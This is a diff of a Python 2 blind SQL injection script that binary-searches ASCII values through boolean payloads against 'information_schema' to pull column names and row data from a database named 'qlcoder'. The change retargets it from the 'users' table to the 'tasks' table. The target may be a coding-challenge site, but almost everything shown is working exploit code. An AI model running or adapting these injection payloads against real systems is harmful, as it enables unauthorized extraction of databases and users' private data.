@@ -97,11 +97,11 @@ def check_schema():
                              " and column_name!='remember_token' "
                 query_str = generate_query_str(
                     "and ascii(substr((select column_name from information_schema.columns "
-                    "where table_schema='qlcoder' and table_name='users'" + cond_str + " limit " + str(
+                    "where table_schema='qlcoder' and table_name='tasks'" + cond_str + " limit " + str(
                         row_idx) + ",1),"
                     + str(col_idx) + ",1))>=" + str(small_idx) +
                     " and ascii(substr((select column_name from information_schema.columns "
-                    "where table_schema='qlcoder' and table_name='users'" + cond_str + " limit " + str(
+                    "where table_schema='qlcoder' and table_name='tasks'" + cond_str + " limit " + str(
                         row_idx) + ",1),"
                     + str(col_idx) + ",1))<=" + str(large_idx))
                 # print query_str
@@ -112,7 +112,7 @@ def check_schema():
                 middle_idx = (small_idx + large_idx) / 2
                 query_str = generate_query_str(
                     "and ascii(substr((select column_name from information_schema.columns "
-                    "where table_schema='qlcoder' and table_name='users'" + cond_str + " limit " + str(
+                    "where table_schema='qlcoder' and table_name='tasks'" + cond_str + " limit " + str(
                         row_idx) + ",1),"
                     + str(col_idx) + ",1))=" + str(middle_idx))
                 # print query_str
@@ -123,7 +123,7 @@ def check_schema():
                 else:
                     query_str = generate_query_str(
                         "and ascii(substr((select column_name from information_schema.columns "
-                        "where table_schema='qlcoder' and table_name='users'" + cond_str + " limit " + str(
+                        "where table_schema='qlcoder' and table_name='tasks'" + cond_str + " limit " + str(
                             row_idx) + ",1),"
                         + str(col_idx) + ",1))<" + str(middle_idx))
                     # print query_str
@@ -172,10 +172,10 @@ def check_strings():
             is_end = False
             while True:
                 query_str = generate_query_str(
-                    "and ascii(substr((select avatar_content_type from qlcoder.users where avatar_content_type limit " + str(
+                    "and ascii(substr((select title from qlcoder.tasks limit " + str(
                         row_idx) + ",1),"
                     + str(col_idx) + ",1))>=" + str(small_idx) +
-                    " and ascii(substr((select avatar_content_type from qlcoder.users where avatar_content_type limit " + str(
+                    " and ascii(substr((select title from qlcoder.tasks limit " + str(
                         row_idx) + ",1),"
                     + str(col_idx) + ",1))<=" + str(large_idx))
                 print query_str
@@ -185,7 +185,7 @@ def check_strings():
 
                 middle_idx = (small_idx + large_idx) / 2
                 query_str = generate_query_str(
-                    "and ascii(substr((select avatar_content_type from qlcoder.users where avatar_content_type limit " + str(
+                    "and ascii(substr((select title from qlcoder.tasks limit " + str(
                         row_idx) + ",1),"
                     + str(col_idx) + ",1))=" + str(middle_idx))
                 if is_successful(get_token(query_str)):
@@ -194,7 +194,7 @@ def check_strings():
                     break
                 else:
                     query_str = generate_query_str(
-                        "and ascii(substr((select avatar_content_type from qlcoder.users where avatar_content_type limit " + str(
+                        "and ascii(substr((select title from qlcoder.tasks limit " + str(
                             row_idx) + ",1),"
                         + str(col_idx) + ",1))<" + str(middle_idx))
                     if is_successful(get_token(query_str)):
@@ -213,6 +213,6 @@ def check_strings():
     print all_rows
 
 
-check_schema()
+# check_schema()
 # check_db_name()
-# check_strings()
+check_strings()
